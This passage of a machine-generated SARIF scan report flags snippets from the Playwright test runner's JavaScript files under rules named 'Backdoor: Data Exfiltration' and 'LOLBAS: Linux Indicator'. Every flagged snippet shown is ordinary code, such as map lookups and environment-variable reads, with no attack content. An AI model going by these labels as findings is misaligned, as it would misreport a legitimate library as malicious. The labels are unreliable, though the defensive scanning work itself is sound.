                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/merge.js"
                },
                "region": {
                  "startLine": 349,
                  "startColumn": 29,
                  "endLine": 349,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    const t1 = this._stringPool.internString(testId);\n    if (this._testIdsMap.has(t1))\n      // already mapped\n      return this._testIdsMap.get(t1);\n    if (this._globalTestIdSet.has(t1)) {\n      // test id is used in another blob, so we need to salt it.\n      const t2 = this._stringPool.internString(testId + this._salt);\n",
                    "rendered": {
                      "text": "    const t1 = this._stringPool.internString(testId);\n    if (this._testIdsMap.has(t1))\n      // already mapped\n      return this._testIdsMap.get(t1);\n    if (this._globalTestIdSet.has(t1)) {\n      // test id is used in another blob, so we need to salt it.\n      const t2 = this._stringPool.internString(testId + this._salt);\n",
                      "markdown": "`    const t1 = this._stringPool.internString(testId);\n    if (this._testIdsMap.has(t1))\n      // already mapped\n      return this._testIdsMap.get(t1);\n    if (this._globalTestIdSet.has(t1)) {\n      // test id is used in another blob, so we need to salt it.\n      const t2 = this._stringPool.internString(testId + this._salt);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/projectUtils.js"
                },
                "region": {
                  "startLine": 137,
                  "startColumn": 22,
                  "endLine": 137,
                  "endColumn": 27,
                  "snippet": {
                    "text": "}\nasync function cachedCollectFiles(testDir, respectGitIgnore, fsCache) {\n  const key = testDir + ':' + respectGitIgnore;\n  let result = fsCache.get(key);\n  if (!result) {\n    result = await collectFiles(testDir, respectGitIgnore);\n    fsCache.set(key, result);\n",
                    "rendered": {
                      "text": "}\nasync function cachedCollectFiles(testDir, respectGitIgnore, fsCache) {\n  const key = testDir + ':' + respectGitIgnore;\n  let result = fsCache.get(key);\n  if (!result) {\n    result = await collectFiles(testDir, respectGitIgnore);\n    fsCache.set(key, result);\n",
                      "markdown": "`}\nasync function cachedCollectFiles(testDir, respectGitIgnore, fsCache) {\n  const key = testDir + ':' + respectGitIgnore;\n  let result = fsCache.get(key);\n  if (!result) {\n    result = await collectFiles(testDir, respectGitIgnore);\n    fsCache.set(key, result);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/projectUtils.js"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 40,
                  "endLine": 115,
                  "endColumn": 45,
                  "snippet": {
                    "text": "      throw error;\n    }\n    result.add(project);\n    for (const reverseDep of reverseDeps.get(project)) visit(depth + 1, reverseDep);\n    if (project.teardown) visit(depth + 1, project.teardown);\n  };\n  for (const forProject of forProjects) visit(0, forProject);\n",
                    "rendered": {
                      "text": "      throw error;\n    }\n    result.add(project);\n    for (const reverseDep of reverseDeps.get(project)) visit(depth + 1, reverseDep);\n    if (project.teardown) visit(depth + 1, project.teardown);\n  };\n  for (const forProject of forProjects) visit(0, forProject);\n",
                      "markdown": "`      throw error;\n    }\n    result.add(project);\n    for (const reverseDep of reverseDeps.get(project)) visit(depth + 1, reverseDep);\n    if (project.teardown) visit(depth + 1, project.teardown);\n  };\n  for (const forProject of forProjects) visit(0, forProject);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/projectUtils.js"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 47,
                  "endLine": 105,
                  "endColumn": 52,
                  "snippet": {
                    "text": "function buildDependentProjects(forProjects, projects) {\n  const reverseDeps = new Map(projects.map(p => [p, []]));\n  for (const project of projects) {\n    for (const dep of project.deps) reverseDeps.get(dep).push(project);\n  }\n  const result = new Set();\n  const visit = (depth, project) => {\n",
                    "rendered": {
                      "text": "function buildDependentProjects(forProjects, projects) {\n  const reverseDeps = new Map(projects.map(p => [p, []]));\n  for (const project of projects) {\n    for (const dep of project.deps) reverseDeps.get(dep).push(project);\n  }\n  const result = new Set();\n  const visit = (depth, project) => {\n",
                      "markdown": "`function buildDependentProjects(forProjects, projects) {\n  const reverseDeps = new Map(projects.map(p => [p, []]));\n  for (const project of projects) {\n    for (const dep of project.deps) reverseDeps.get(dep).push(project);\n  }\n  const result = new Set();\n  const visit = (depth, project) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/projectUtils.js"
                },
                "region": {
                  "startLine": 95,
                  "startColumn": 14,
                  "endLine": 95,
                  "endColumn": 19,
                  "snippet": {
                    "text": "      throw error;\n    }\n    if (depth === 0 && hasTests && !hasTests(project)) return;\n    if (result.get(project) !== 'dependency') result.set(project, depth ? 'dependency' : 'top-level');\n    for (const dep of project.deps) visit(depth + 1, dep);\n    if (project.teardown) visit(depth + 1, project.teardown);\n  };\n",
                    "rendered": {
                      "text": "      throw error;\n    }\n    if (depth === 0 && hasTests && !hasTests(project)) return;\n    if (result.get(project) !== 'dependency') result.set(project, depth ? 'dependency' : 'top-level');\n    for (const dep of project.deps) visit(depth + 1, dep);\n    if (project.teardown) visit(depth + 1, project.teardown);\n  };\n",
                      "markdown": "`      throw error;\n    }\n    if (depth === 0 && hasTests && !hasTests(project)) return;\n    if (result.get(project) !== 'dependency') result.set(project, depth ? 'dependency' : 'top-level');\n    for (const dep of project.deps) visit(depth + 1, dep);\n    if (project.teardown) visit(depth + 1, project.teardown);\n  };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/projectUtils.js"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 27,
                  "endLine": 79,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  const result = new Map();\n  for (const project of projects) {\n    if (project.teardown) {\n      const setups = result.get(project.teardown) || [];\n      setups.push(project);\n      result.set(project.teardown, setups);\n    }\n",
                    "rendered": {
                      "text": "  const result = new Map();\n  for (const project of projects) {\n    if (project.teardown) {\n      const setups = result.get(project.teardown) || [];\n      setups.push(project);\n      result.set(project.teardown, setups);\n    }\n",
                      "markdown": "`  const result = new Map();\n  for (const project of projects) {\n    if (project.teardown) {\n      const setups = result.get(project.teardown) || [];\n      setups.push(project);\n      result.set(project.teardown, setups);\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/watchMode.js"
                },
                "region": {
                  "startLine": 264,
                  "startColumn": 77,
                  "endLine": 264,
                  "endColumn": 82,
                  "snippet": {
                    "text": "  const projects = (0, _projectUtils.filterProjects)(config.projects, config.cliProjectFilter);\n  const projectClosure = (0, _projectUtils.buildProjectsClosure)(projects);\n  const affectedProjects = affectedProjectsClosure([...projectClosure.keys()], [...filesByProject.keys()]);\n  const affectsAnyDependency = [...affectedProjects].some(p => projectClosure.get(p) === 'dependency');\n\n  // If there are affected dependency projects, do the full run, respect the original CLI.\n  // if there are no affected dependency projects, intersect CLI with dirty files\n",
                    "rendered": {
                      "text": "  const projects = (0, _projectUtils.filterProjects)(config.projects, config.cliProjectFilter);\n  const projectClosure = (0, _projectUtils.buildProjectsClosure)(projects);\n  const affectedProjects = affectedProjectsClosure([...projectClosure.keys()], [...filesByProject.keys()]);\n  const affectsAnyDependency = [...affectedProjects].some(p => projectClosure.get(p) === 'dependency');\n\n  // If there are affected dependency projects, do the full run, respect the original CLI.\n  // if there are no affected dependency projects, intersect CLI with dirty files\n",
                      "markdown": "`  const projects = (0, _projectUtils.filterProjects)(config.projects, config.cliProjectFilter);\n  const projectClosure = (0, _projectUtils.buildProjectsClosure)(projects);\n  const affectedProjects = affectedProjectsClosure([...projectClosure.keys()], [...filesByProject.keys()]);\n  const affectsAnyDependency = [...affectedProjects].some(p => projectClosure.get(p) === 'dependency');\n\n  // If there are affected dependency projects, do the full run, respect the original CLI.\n  // if there are no affected dependency projects, intersect CLI with dirty files\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/watchMode.js"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 38,
                  "endLine": 69,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      for (const [project, filter] of projectFilters) {\n        const filteredFiles = testFileArray.filter(filter);\n        if (!filteredFiles.length) continue;\n        let set = this._dirtyTestFiles.get(project);\n        if (!set) {\n          set = new Set();\n          this._dirtyTestFiles.set(project, set);\n",
                    "rendered": {
                      "text": "      for (const [project, filter] of projectFilters) {\n        const filteredFiles = testFileArray.filter(filter);\n        if (!filteredFiles.length) continue;\n        let set = this._dirtyTestFiles.get(project);\n        if (!set) {\n          set = new Set();\n          this._dirtyTestFiles.set(project, set);\n",
                      "markdown": "`      for (const [project, filter] of projectFilters) {\n        const filteredFiles = testFileArray.filter(filter);\n        if (!filteredFiles.length) continue;\n        let set = this._dirtyTestFiles.get(project);\n        if (!set) {\n          set = new Set();\n          this._dirtyTestFiles.set(project, set);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testGroups.js"
                },
                "region": {
                  "startLine": 75,
                  "startColumn": 44,
                  "endLine": 75,
                  "endColumn": 49,
                  "snippet": {
                    "text": "        withRequireFile.parallelWithHooks.tests.push(test);\n      } else {\n        const key = outerMostSequentialSuite || test;\n        let group = withRequireFile.parallel.get(key);\n        if (!group) {\n          group = createGroup(test);\n          withRequireFile.parallel.set(key, group);\n",
                    "rendered": {
                      "text": "        withRequireFile.parallelWithHooks.tests.push(test);\n      } else {\n        const key = outerMostSequentialSuite || test;\n        let group = withRequireFile.parallel.get(key);\n        if (!group) {\n          group = createGroup(test);\n          withRequireFile.parallel.set(key, group);\n",
                      "markdown": "`        withRequireFile.parallelWithHooks.tests.push(test);\n      } else {\n        const key = outerMostSequentialSuite || test;\n        let group = withRequireFile.parallel.get(key);\n        if (!group) {\n          group = createGroup(test);\n          withRequireFile.parallel.set(key, group);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testGroups.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 40,
                  "endLine": 51,
                  "endColumn": 45,
                  "snippet": {
                    "text": "      withWorkerHash = new Map();\n      groups.set(test._workerHash, withWorkerHash);\n    }\n    let withRequireFile = withWorkerHash.get(test._requireFile);\n    if (!withRequireFile) {\n      withRequireFile = {\n        general: createGroup(test),\n",
                    "rendered": {
                      "text": "      withWorkerHash = new Map();\n      groups.set(test._workerHash, withWorkerHash);\n    }\n    let withRequireFile = withWorkerHash.get(test._requireFile);\n    if (!withRequireFile) {\n      withRequireFile = {\n        general: createGroup(test),\n",
                      "markdown": "`      withWorkerHash = new Map();\n      groups.set(test._workerHash, withWorkerHash);\n    }\n    let withRequireFile = withWorkerHash.get(test._requireFile);\n    if (!withRequireFile) {\n      withRequireFile = {\n        general: createGroup(test),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/testGroups.js"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 31,
                  "endLine": 46,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    };\n  };\n  for (const test of projectSuite.allTests()) {\n    let withWorkerHash = groups.get(test._workerHash);\n    if (!withWorkerHash) {\n      withWorkerHash = new Map();\n      groups.set(test._workerHash, withWorkerHash);\n",
                    "rendered": {
                      "text": "    };\n  };\n  for (const test of projectSuite.allTests()) {\n    let withWorkerHash = groups.get(test._workerHash);\n    if (!withWorkerHash) {\n      withWorkerHash = new Map();\n      groups.set(test._workerHash, withWorkerHash);\n",
                      "markdown": "`    };\n  };\n  for (const test of projectSuite.allTests()) {\n    let withWorkerHash = groups.get(test._workerHash);\n    if (!withWorkerHash) {\n      withWorkerHash = new Map();\n      groups.set(test._workerHash, withWorkerHash);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/transform.js"
                },
                "region": {
                  "startLine": 80,
                  "startColumn": 24,
                  "endLine": 80,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    });\n    cachedTSConfigs.set(cwd, loaded.map(validateTsConfig));\n  }\n  return cachedTSConfigs.get(cwd);\n}\nconst pathSeparator = process.platform === 'win32' ? ';' : ':';\nconst builtins = new Set(_module.default.builtinModules);\n",
                    "rendered": {
                      "text": "    });\n    cachedTSConfigs.set(cwd, loaded.map(validateTsConfig));\n  }\n  return cachedTSConfigs.get(cwd);\n}\nconst pathSeparator = process.platform === 'win32' ? ';' : ':';\nconst builtins = new Set(_module.default.builtinModules);\n",
                      "markdown": "`    });\n    cachedTSConfigs.set(cwd, loaded.map(validateTsConfig));\n  }\n  return cachedTSConfigs.get(cwd);\n}\nconst pathSeparator = process.platform === 'win32' ? ';' : ':';\nconst builtins = new Set(_module.default.builtinModules);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/transform.js"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 2,
                  "endLine": 163,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n  // We don't use any browserslist data, but babel checks it anyway.\n  // Silence the annoying warning.\n  process.env.BROWSERSLIST_IGNORE_OLD_DATA = 'true';\n  const {\n    babelTransform\n  } = require('./babelBundle');\n",
                    "rendered": {
                      "text": "\n  // We don't use any browserslist data, but babel checks it anyway.\n  // Silence the annoying warning.\n  process.env.BROWSERSLIST_IGNORE_OLD_DATA = 'true';\n  const {\n    babelTransform\n  } = require('./babelBundle');\n",
                      "markdown": "`\n  // We don't use any browserslist data, but babel checks it anyway.\n  // Silence the annoying warning.\n  process.env.BROWSERSLIST_IGNORE_OLD_DATA = 'true';\n  const {\n    babelTransform\n  } = require('./babelBundle');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/transform.js"
                },
                "region": {
                  "startLine": 149,
                  "startColumn": 46,
                  "endLine": 149,
                  "endColumn": 57,
                  "snippet": {
                    "text": "processor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = calculateHash(originalCode, filename, !!moduleUrl, pluginsPrologue, pluginsEpilogue);\n  const {\n    cachedCode,\n    addToCache,\n    serializedCache\n  } = (0, _compilationCache.getFromCompilationCache)(filename, hash, moduleUrl);\n  if (cachedCode !== u",
                    "rendered": {
                      "text": "processor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = calculateHash(originalCode, filename, !!moduleUrl, pluginsPrologue, pluginsEpilogue);\n  const {\n    cachedCode,\n    addToCache,\n    serializedCache\n  } = (0, _compilationCache.getFromCompilationCache)(filename, hash, moduleUrl);\n  if (cachedCode !== u",
                      "markdown": "`processor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = calculateHash(originalCode, filename, !!moduleUrl, pluginsPrologue, pluginsEpilogue);\n  const {\n    cachedCode,\n    addToCache,\n    serializedCache\n  } = (0, _compilationCache.getFromCompilationCache)(filename, hash, moduleUrl);\n  if (cachedCode !== u`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/transform.js"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 112,
                  "endLine": 147,
                  "endColumn": 123,
                  "snippet": {
                    "text": " transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = calculateHash(originalCode, filename, !!moduleUrl",
                    "rendered": {
                      "text": " transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = calculateHash(originalCode, filename, !!moduleUrl",
                      "markdown": "` transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = calculateHash(originalCode, filename, !!moduleUrl`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/transform.js"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 66,
                  "endLine": 147,
                  "endColumn": 77,
                  "snippet": {
                    "text": "ansformData.set(pluginName, value);\n}\nfunction transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = cal",
                    "rendered": {
                      "text": "ansformData.set(pluginName, value);\n}\nfunction transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = cal",
                      "markdown": "`ansformData.set(pluginName, value);\n}\nfunction transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOURCE_TRANSFORM]] : [];\n  const hash = cal`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/transform.js"
                },
                "region": {
                  "startLine": 147,
                  "startColumn": 26,
                  "endLine": 147,
                  "endColumn": 37,
                  "snippet": {
                    "text": "tTransformData(pluginName, value) {\n  transformData.set(pluginName, value);\n}\nfunction transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOU",
                    "rendered": {
                      "text": "tTransformData(pluginName, value) {\n  transformData.set(pluginName, value);\n}\nfunction transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOU",
                      "markdown": "`tTransformData(pluginName, value) {\n  transformData.set(pluginName, value);\n}\nfunction transformHook(originalCode, filename, moduleUrl) {\n  const isTypeScript = filename.endsWith('.ts') || filename.endsWith('.tsx') || filename.endsWith('.mts') || filename.endsWith('.cts');\n  const hasPreprocessor = process.env.PW_TEST_SOURCE_TRANSFORM && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE && process.env.PW_TEST_SOURCE_TRANSFORM_SCOPE.split(pathSeparator).some(f => filename.startsWith(f));\n  const pluginsPrologue = _transformConfig.babelPlugins;\n  const pluginsEpilogue = hasPreprocessor ? [[process.env.PW_TEST_SOU`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/common/testType.js"
                },
                "region": {
                  "startLine": 71,
                  "startColumn": 47,
                  "endLine": 71,
                  "endColumn": 55,
                  "snippet": {
                    "text": ");\n      if (!result) throw new Error('test.info() can only be called while test is running');\n      return result;\n    };\n    this.test = test;\n  }\n  _currentSuite(title) {\n    const suite = (0, _globals.currentlyLoadingFileSuite)();\n    if (!suite) {\n      throw new Error([`Playwright Test did not expect ${title} to be called here.`, `Most common reasons include:`, `- You are calling ${title} in a configuration file.`, `- You are calling ${title} in a file that is imported by the configuration file.`, `- You have two different versions of @playwright/test. This usually happens`, `  when one of the d",
                    "rendered": {
                      "text": ");\n      if (!result) throw new Error('test.info() can only be called while test is running');\n      return result;\n    };\n    this.test = test;\n  }\n  _currentSuite(title) {\n    const suite = (0, _globals.currentlyLoadingFileSuite)();\n    if (!suite) {\n      throw new Error([`Playwright Test did not expect ${title} to be called here.`, `Most common reasons include:`, `- You are calling ${title} in a configuration file.`, `- You are calling ${title} in a file that is imported by the configuration file.`, `- You have two different versions of @playwright/test. This usually happens`, `  when one of the d",
